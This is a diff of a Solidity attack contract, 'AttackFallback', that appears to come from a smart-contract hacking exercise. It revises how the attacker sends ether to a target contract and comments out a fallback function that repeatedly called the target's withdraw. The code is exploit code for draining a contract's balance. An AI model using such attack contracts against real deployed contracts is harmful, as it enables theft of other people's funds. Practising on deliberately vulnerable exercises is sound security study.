@@ -15,19 +15,19 @@ contract AttackFallback {
         target.contribute{value: 0.0001 ether}();
     }
 
-     function sendEth() external {
-        payable(address(target)).send(0.0001 ether);
+     function sendEth() external  payable{
+        payable(address(target)).transfer(0.0001 ether);
     }
 
      function withdraw() external {
         target.withdraw();
     }
 
-    fallback() payable external{
-        if(address(target).balance > 0){
-            target.withdraw();
-        }
-    }
+    // fallback() payable external{
+    //     if(address(target).balance > 0){
+    //         target.withdraw();
+    //     }
+    // }
 
     function get(address payable to) external {
         require(owner == msg.sender);
